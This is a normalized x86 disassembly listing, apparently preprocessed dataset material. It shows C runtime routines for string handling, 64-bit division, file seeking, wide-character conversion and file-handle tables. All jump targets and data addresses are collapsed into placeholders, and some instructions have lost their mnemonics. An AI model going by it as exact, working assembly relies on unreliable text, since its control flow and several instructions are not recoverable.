mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40a5cd
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_40a60f
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40a541
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40a60f
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_40a60f
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_40a5e8
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_40a60f
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_40a834
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40cc69
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40a808
add esp 0x24
leave
retn
sub_40a861
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40cc69
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40a81e
add esp 0x24
leave
retn
sub_40a890
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40a8a0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40a980
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_40ab20
inc eax
push eax
push edi
push esi
call sub_409eb0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_40a9f7
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40aa5b
pop ecx
lea esi [ ebp - 0xc ]
pop ecx
push rw-data
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40d13a
mov [ rw-data ] eax
add esp 0x18
movsx eax [ rw-data ]
mov [ rw-data ] eax
pop edi
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] rw-data
mov eax rw-data
pop esi
leave
retn
sub_40aa5b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40ab20
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40aba4
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_40b5ec
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_40b3ff
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_40ac3e
inc [ rw-data ]
push 0x1000
call sub_4044f2
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40aca8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
mov [ rw-data ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_40ad70
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40ade0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40ae55
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_40d3cd
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax rw-data
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 8 ]
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_40b939
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x2a
dec [ esi + 0x4 ]
js r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + 0xc ]
push esi
push eax
call sub_405c45
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
inc [ esi ]
movzx eax [ ebp + 0xc ]
jmp r-xdata
movsx eax [ ebp + 0xc ]
push esi
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
movzx eax [ ebp + 0xc ]
or ax 0xffff
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
movsx eax [ ebp + 0xd ]
push esi
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xd ]
mov [ eax ] cl
movzx eax [ ebp + 0xd ]
jmp r-xdata
push eax
call sub_405c45
pop ecx
pop ecx
inc [ esi ]
jmp r-xdata
sub_40af4a
push ebp
mov ebp esp
sub esp 0x58
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
movzx ecx [ eax ]
mov eax [ esi ]
push edi
dec eax
mov [ ebp + 0x10 ] ecx
je r-xdata
push 0x8
dec eax
je r-xdata
push 0xffff
push [ ebp + 0x10 ]
call sub_40da01
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x10
je r-xdata
push 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_40d9bb
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x20 ]
fld [ esi + 0x10 ]
and ecx 0xffffffe3
fstp [ ebp - 0x30 ]
or ecx 0x3
mov [ ebp - 0x20 ] ecx
cmp eax 0x16
je r-xdata
pop ebx
lea edi [ esi + 0x18 ]
push ecx
push edi
push ebx
call sub_40d7a4
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_40d9e1
test eax eax
pop ecx
jne r-xdata
cmp eax 0x1d
je r-xdata
push 0x12
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x20 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
lea ecx [ esi + 0x8 ]
push edi
push ecx
push eax
lea eax [ ebp + 0x10 ]
push ebx
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_40d4f1
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
push 0x10
jmp r-xdata
sub_40b031
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
test cl 0x8
jne r-xdata
movsx eax bl
push eax
call sub_40da7a
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test cl 0x4
mov eax 0x7fffffff
jne r-xdata
test edx edx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
test [ ebp + 0x14 ] 0x1
mov [ rw-data ] 0x22
je r-xdata
test cl 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov ecx [ ebp + 0x14 ]
and cl 0x2
neg cl
sbb ecx ecx
neg ecx
add ecx eax
mov [ ebp - 0x8 ] ecx
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test edx edx
je r-xdata
and ecx 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
test ecx ecx
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] eax
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40b250
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40b310
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40b390
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_40b3d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40b3ff
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_40b466
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_4044f2
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_40b4fb
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40b572
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40b5ec
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_40b629
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
